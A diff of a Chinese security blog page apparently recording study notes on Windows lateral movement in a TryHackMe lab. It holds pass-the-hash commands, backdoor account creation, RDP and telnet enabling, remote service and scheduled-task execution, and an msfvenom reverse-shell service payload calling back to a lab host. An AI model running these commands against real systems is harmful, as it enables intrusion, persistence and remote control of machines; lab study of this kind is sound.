@@ -5,13 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="内网横向的一些方式, TEST &amp; 安全研究员">
-    <meta name="description" content="1. RDP
-3389 开启就可以了明文和hash都可以直接使用来达到连接的作用。
-
-1xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH  
-
-2. Psexec 执行程序
-Por">
+    <meta name="description" content="1. RDP1.1 开启rdp12345678910111213141516171819202122232425reg add &amp;quot;HKLM\System\CurrentControlSet\Control\Terminal Ser">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -414,21 +408,21 @@ Por">
                         
                             <div class="post-date info-break-policy">
                                 <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                                    2025-01-29
+                                    2025-02-01
                             </div>
                             
 
                                 
                                     <div class="info-break-policy">
                                         <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                                            4.4k
+                                            4.7k
                                     </div>
                                     
 
                                         
                                             <div class="info-break-policy">
                                                 <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                                                    17
+                                                    18
                                                         分
                                             </div>
                                             
@@ -451,10 +445,14 @@ Por">
 
                 <div class="card-content article-card-content">
                     <div id="articleContent">
-                        <h4 id="1-RDP"><a href="#1-RDP" class="headerlink" title="1. RDP"></a>1. RDP</h4><ul>
+                        <h4 id="1-RDP"><a href="#1-RDP" class="headerlink" title="1. RDP"></a>1. RDP</h4><h5 id="1-1-开启rdp"><a href="#1-1-开启rdp" class="headerlink" title="1.1 开启rdp"></a>1.1 开启rdp</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更改端口</span></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置通过防火墙端口</span></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启计算机</span></span><br><span class="line"></span><br><span class="line">shutdown /r /f /t 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以重启服务避免重启计算机</span></span><br><span class="line"></span><br><span class="line">net stop termservice</span><br><span class="line">net start termservice</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">powershell</span></span><br><span class="line"></span><br><span class="line">Restart-Service -Name &quot;TermService&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="1-2-自建用户"><a href="#1-2-自建用户" class="headerlink" title="1.2 自建用户"></a>1.2 自建用户</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> net user hack hack /add</span><br><span class="line"></span><br><span class="line">发现添加不成功，后来发现是因为有密码设置策略，密码不能太简单且不能包含用户名</span><br><span class="line"></span><br><span class="line"> net user hack qaz@123</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>3389 开启就可以了<br>明文和hash都可以直接使用来达到连接的作用。</li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH  </span><br></pre></td></tr></table></figure>
+
 
 <h4 id="2-Psexec-执行程序"><a href="#2-Psexec-执行程序" class="headerlink" title="2. Psexec 执行程序"></a>2. Psexec 执行程序</h4><ul>
 <li><strong>Ports:</strong> 445&#x2F;TCP (SMB)<br>  <strong>端口：</strong> 445&#x2F; TCP （ SMB ）</li>
@@ -469,7 +467,7 @@ Por">
 <h5 id="2-2-linux通过hash进行连接"><a href="#2-2-linux通过hash进行连接" class="headerlink" title="2.2  linux通过hash进行连接"></a>2.2  linux通过hash进行连接</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP</span><br><span class="line"></span><br><span class="line">psexec.py administrator@172.22.15.24 -hashes &#x27;0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br></pre></td></tr></table></figure>
 
 <p>但是针对于psexec来讲，我们使用的pth 只能是linux版本的psexec 进行PTH利用hash凭据而并非明文就可以进行登陆。</p>
-<h4 id="2-WinRM-远程创建进程"><a href="#2-WinRM-远程创建进程" class="headerlink" title="2.  WinRM 远程创建进程"></a>2.  WinRM 远程创建进程</h4><h5 id="2-1-winrm-介绍"><a href="#2-1-winrm-介绍" class="headerlink" title="2. 1 winrm 介绍"></a>2. 1 winrm 介绍</h5><p>WinRM 使用 <strong>SOAP</strong> 协议来封装和传输命令和请求。WinRM 通过 <strong>WS-Management</strong>（Web Services Management）标准来进行通信，这个标准使用了 <strong>SOAP</strong> 来传递消息。</p>
+<h5 id="2-3-cs中的-psexec"><a href="#2-3-cs中的-psexec" class="headerlink" title="2.3 cs中的 psexec"></a>2.3 cs中的 psexec</h5><h4 id="3-WinRM-远程创建进程"><a href="#3-WinRM-远程创建进程" class="headerlink" title="3.  WinRM 远程创建进程"></a>3.  WinRM 远程创建进程</h4><h5 id="3-1-winrm-介绍"><a href="#3-1-winrm-介绍" class="headerlink" title="3. 1 winrm 介绍"></a>3. 1 winrm 介绍</h5><p>WinRM 使用 <strong>SOAP</strong> 协议来封装和传输命令和请求。WinRM 通过 <strong>WS-Management</strong>（Web Services Management）标准来进行通信，这个标准使用了 <strong>SOAP</strong> 来传递消息。</p>
 <ul>
 <li><strong>SOAP</strong>：是一种基于 XML 的协议，用于在计算机网络上交换结构化信息，尤其适用于 Web 服务通信。</li>
 <li><strong>WS-Management</strong>：是一个 Web 服务标准，用于通过网络远程管理系统。它基于 SOAP 和 HTTP(S) 协议实现，WinRM 就是实现了这一标准</li>
@@ -498,11 +496,11 @@ Por">
 
 <p>Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Computername</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="2-1-evil-winrm"><a href="#2-1-evil-winrm" class="headerlink" title="2.1   evil-winrm"></a>2.1   evil-winrm</h5><p>这是一个综合的工具，不仅仅是拿到shell<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/17202253.html">https://www.cnblogs.com/backlion/p/17202253.html</a></p>
+<h5 id="3-2-evil-winrm"><a href="#3-2-evil-winrm" class="headerlink" title="3.2   evil-winrm"></a>3.2   evil-winrm</h5><p>这是一个综合的工具，不仅仅是拿到shell<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/17202253.html">https://www.cnblogs.com/backlion/p/17202253.html</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">hash</span></span></span><br><span class="line"></span><br><span class="line">evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">明文</span></span><br><span class="line"></span><br><span class="line">evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987</span><br></pre></td></tr></table></figure>
 
 
-<h4 id="3-使用-sc远程创建服务"><a href="#3-使用-sc远程创建服务" class="headerlink" title="3. 使用 sc远程创建服务"></a>3. 使用 sc远程创建服务</h4><ul>
+<h4 id="4-使用-sc远程创建服务"><a href="#4-使用-sc远程创建服务" class="headerlink" title="4. 使用 sc远程创建服务"></a>4. 使用 sc远程创建服务</h4><ul>
 <li><strong>Ports: 端口：</strong><ul>
 <li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)<br>  135&#x2F; TCP ，49152-65535&#x2F; TCP （DCE&#x2F;RPC）</li>
 </ul>
@@ -523,7 +521,7 @@ Por">
 <li>如果当前用户在远程计算机上没有足够的权限（例如管理员权限），操作会失败，通常会返回类似“拒绝访问”或“权限不足”的错误。</li>
 </ul>
 <p>SMB 协议和 445 端口的开放对于使用 <code>sc.exe</code> 来进行远程服务操作是非常重要的，但 <strong>RPC 协议</strong>（尤其是 135 端口和动态端口）也可能起到作用。因此，除了 445 端口外，RPC 相关端口也需要开放才能确保远程管理操作成功。</p>
-<h6 id="创建-Windows-服务时的注意事项："><a href="#创建-Windows-服务时的注意事项：" class="headerlink" title="创建 Windows 服务时的注意事项："></a>创建 Windows 服务时的注意事项：</h6><ol>
+<h5 id="4-1-创建-Windows-服务时的注意事项："><a href="#4-1-创建-Windows-服务时的注意事项：" class="headerlink" title="4.1 创建 Windows 服务时的注意事项："></a>4.1 创建 Windows 服务时的注意事项：</h5><ol>
 <li><p><strong>权限</strong>：</p>
 <ul>
 <li>Windows 服务通常在系统级别运行，因此需要相应的权限。确保你有足够的权限来创建和管理服务。</li>
@@ -569,7 +567,7 @@ Por">
 <p>服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。</p>
 <p>要停止并删除该服务，我们可以执行以下命令：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET stop THMservice</span><br><span class="line">sc.exe \\TARGET delete THMservice</span><br></pre></td></tr></table></figure>
-<h4 id="4-远程创建计划任务"><a href="#4-远程创建计划任务" class="headerlink" title="4. 远程创建计划任务"></a>4. 远程创建计划任务</h4><ul>
+<h4 id="5-远程创建计划任务"><a href="#5-远程创建计划任务" class="headerlink" title="5. 远程创建计划任务"></a>5. 远程创建计划任务</h4><ul>
 <li><strong>Ports: 端口：</strong><ul>
 <li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)<br>  135&#x2F; TCP ，49152-65535&#x2F; TCP （DCE&#x2F;RPC）</li>
 </ul>
@@ -586,7 +584,7 @@ Por">
 <p>由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。</p>
 <p>最后，要删除计划任务，我们可以使用以下命令并自行清理：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /S TARGET /TN <span class="string">&quot;THMtask1&quot;</span> /DELETE /F</span><br></pre></td></tr></table></figure>
-<h4 id="5-netexec"><a href="#5-netexec" class="headerlink" title="5. netexec"></a>5. netexec</h4><table>
+<h4 id="6-netexec"><a href="#6-netexec" class="headerlink" title="6 netexec"></a>6 netexec</h4><table>
 <thead>
 <tr>
 <th>特性</th>
@@ -630,7 +628,7 @@ Por">
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">smb 连接</span> </span><br><span class="line">netexec smb $(IP) -u ftpuser -p &#x27;KeepGoingBro!!!&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ssh 连接</span></span><br><span class="line">netexec ssh $(IP) -u ftpuser -p &#x27;KeepGoingBro!!!&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ftp 连接</span></span><br><span class="line">netexec ftp $(IP) -u ftpuser -p &#x27;KeepGoingBro!!!&#x27;</span><br></pre></td></tr></table></figure>
 
 
-<h5 id="netexec-of-msf"><a href="#netexec-of-msf" class="headerlink" title="netexec of msf"></a><strong>netexec of msf</strong></h5><p><strong>Metasploit 示例：</strong></p>
+<h5 id="6-1-netexec-of-msf"><a href="#6-1-netexec-of-msf" class="headerlink" title="6.1 netexec of msf"></a>6.1 <strong>netexec of msf</strong></h5><p><strong>Metasploit 示例：</strong></p>
 <ol>
 <li>启动 Metasploit。</li>
 <li>选择模块（例如 <code>windows/smb/netexec</code>）。</li>
@@ -639,7 +637,7 @@ Por">
 </ol>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/netexec</span><br><span class="line">set RHOSTS 192.168.1.10</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass password123</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<h4 id="6-实战实例"><a href="#6-实战实例" class="headerlink" title="6. 实战实例"></a>6. 实战实例</h4><p>针对特定的本地任务</p>
+<h4 id="7-实战实例"><a href="#7-实战实例" class="headerlink" title="7. 实战实例"></a>7. 实战实例</h4><p>针对特定的本地任务</p>
 <p><strong>用户：</strong> ZA.TRYHACKME.COM\t1_leonard.summers<br><strong>密码：</strong> EZpass4ever</p>
 <p>虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用<code>net user</code> ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持<code>exe-service</code>格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止它被杀死。</p>
 <p>在 Windows 中，<code>.exe</code> 文件是可执行文件的标准扩展名，用于运行程序。而 <code>exe-service</code> 可能指的是在服务环境中运行的可执行程序，通常是 Windows 服务（Service），它们在后台运行并可以在系统启动时自动启动。</p>
@@ -650,15 +648,15 @@ Por">
 </ul>
 <p>因此分析一下目前我们的优势，首先我们目前有对应横向主机的一个管理员用户，并且此时我们准备打算采用sc.exe的方式来创建对应的一个服务同时来执行相关命令，我们不来创建用户我们来直接用一个服务的可执行文件，我们可以使用直接用这个负载来反弹一个shell。</p>
 <p>但是此时我们准备横向的是THMIIS  并且此时我们已经拿到对应的相关的THMIIS 上的一个管理员的凭据 那么此时我准备尝试不同的方式去横向到对应的 服务器上。</p>
-<h5 id="6-1-ssh尝试"><a href="#6-1-ssh尝试" class="headerlink" title="6.1 ssh尝试"></a>6.1 ssh尝试</h5><p>首先根据我们的主旨，我们需要横向到对应的主机。第一步肯定是伪装我们目前是处于一个thmjmp2 的机器上我目前还不知道它属于什么组。可以查一下经过命令查询可以看到它属于domain 和 internet组 但是我目前想知道他属于哪一个ou<br>由于我发现我目前的凭证并不是管理员用户，所以我无法使用cmdlet 和mmc 进行收集。此时使用猎狗sharphound </p>
+<h5 id="7-1-ssh尝试"><a href="#7-1-ssh尝试" class="headerlink" title="7.1 ssh尝试"></a>7.1 ssh尝试</h5><p>首先根据我们的主旨，我们需要横向到对应的主机。第一步肯定是伪装我们目前是处于一个thmjmp2 的机器上我目前还不知道它属于什么组。可以查一下经过命令查询可以看到它属于domain 和 internet组 但是我目前想知道他属于哪一个ou<br>由于我发现我目前的凭证并不是管理员用户，所以我无法使用cmdlet 和mmc 进行收集。此时使用猎狗sharphound </p>
 <p>首先使用ssh</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh t1_leonard.summers@thmiis.za.tryhackme.com </span><br></pre></td></tr></table></figure>
 <p>成功</p>
-<h5 id="6-2-psexec"><a href="#6-2-psexec" class="headerlink" title="6.2 psexec"></a>6.2 psexec</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe \\thmiis.za.tryhackme.com  -u t1_leonard.summers   -p EZpass4ever -i cmd.exe</span><br></pre></td></tr></table></figure>
+<h5 id="7-2-psexec"><a href="#7-2-psexec" class="headerlink" title="7.2 psexec"></a>7.2 psexec</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe \\thmiis.za.tryhackme.com  -u t1_leonard.summers   -p EZpass4ever -i cmd.exe</span><br></pre></td></tr></table></figure>
 <p>这个不知道为啥一直失败</p>
-<h5 id="6-3-winrm"><a href="#6-3-winrm" class="headerlink" title="6.3 winrm"></a>6.3 winrm</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -u:t1_leonard.summers -p:EZpass4ever -r:thmiis.za.tryhackme.com  cmd</span><br></pre></td></tr></table></figure>
+<h5 id="7-3-winrm"><a href="#7-3-winrm" class="headerlink" title="7.3 winrm"></a>7.3 winrm</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -u:t1_leonard.summers -p:EZpass4ever -r:thmiis.za.tryhackme.com  cmd</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907211732.png" alt="image.png"></p>
-<h5 id="6-4-sc-exe"><a href="#6-4-sc-exe" class="headerlink" title="6.4 sc.exe"></a>6.4 sc.exe</h5><p>windows服务相关的内容不再赘述，我们直接生成对应的exe-service</p>
+<h5 id="7-4-sc-exe"><a href="#7-4-sc-exe" class="headerlink" title="7.4 sc.exe"></a>7.4 sc.exe</h5><p>windows服务相关的内容不再赘述，我们直接生成对应的exe-service</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.148.56 LPORT=4444 -o k1t0service.exe</span><br></pre></td></tr></table></figure>
 
 <p>然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：</p>
@@ -675,7 +673,41 @@ Por">
 
 <p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240908100905.png" alt="image.png"></p>
 <p>成功使用sc 服务反弹回来一个shell ，并且是根据一个负载和一个服务捆绑。<br>但是一定要注意，我们的服务名称和一个服务的路径一定要是独属于自己的。</p>
-<h4 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h4><p>看似我们在横向移动，其实我们这种方式是非常鸡肋的。我们无论是psexec，winrm ，定时任务，sc服务，ssh，rdp进行一个横向我们都是需要一个管理员用户的……..可以称为这个集合为我们拿到一定的凭据之后可以采用的一些姿势。同时可以附加一点，针对于我们的凭据进行远程的进程创建，我们还可以进行hash作为一个凭据验证，包括我们的wmi。</p>
+<h4 id="8-netbios"><a href="#8-netbios" class="headerlink" title="8. netbios"></a>8. netbios</h4><p>netbios也是一个远程控制的一个协议,通过netbios我们可以像ssh一样进行一个远程控制</p>
+<h5 id="8-1-开启netbios"><a href="#8-1-开启netbios" class="headerlink" title="8.1 开启netbios"></a>8.1 开启netbios</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sc config tlntsvr start= auto</span><br><span class="line">net start telnet</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看23 端口</span></span><br><span class="line">netstat -an</span><br></pre></td></tr></table></figure>
+<h5 id="8-2-msf连接"><a href="#8-2-msf连接" class="headerlink" title="8.2 msf连接"></a>8.2 msf连接</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line"></span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line"></span><br><span class="line">set username hack</span><br><span class="line"></span><br><span class="line">set PASSWORD qaz@123</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-vnc"><a href="#9-vnc" class="headerlink" title="9.vnc"></a>9.vnc</h4><p>vnc并不是windows自带服务,我们要先判断是否vnc服务已经安装.</p>
+<ol>
+<li>netstat -an | find “5900”</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCP 0.0.0.0:5900 0.0.0.0:0 LISTENING</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>服务<br>VNC 服务器通常会作为 Windows 服务启动。你可以通过以下步骤查看是否有 VNC 服务：</li>
+</ol>
+<ul>
+<li>. 按 <strong>Win + R</strong> 键，输入 <code>services.msc</code> 然后按回车。</li>
+<li>. 在服务列表中，查看是否有以下服务：<ul>
+<li><strong>TightVNC Server</strong> 或 <strong>VNC Server</strong>。</li>
+<li><strong>UltraVNC Server</strong>。</li>
+<li><strong>RealVNC Server</strong>。</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>进程</li>
+</ol>
+<p>你可以检查系统中是否有 VNC 服务或相关进程正在运行：</p>
+<ul>
+<li>按 <strong>Ctrl + Shift + Esc</strong> 打开 <strong>任务管理器</strong>。</li>
+<li>查看是否有以下进程：<ul>
+<li><strong>vncserver.exe</strong> 或 <strong>tvnserver.exe</strong>（TightVNC）</li>
+<li><strong>winvnc.exe</strong>（UltraVNC）</li>
+<li><strong>vncserver.exe</strong>（RealVNC）</li>
+</ul>
+</li>
+</ul>
 
                             
                     </div>
@@ -1017,7 +1049,7 @@ Por">
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">138.9k</span>
+                        class="white-color">142.3k</span>
             
             
             
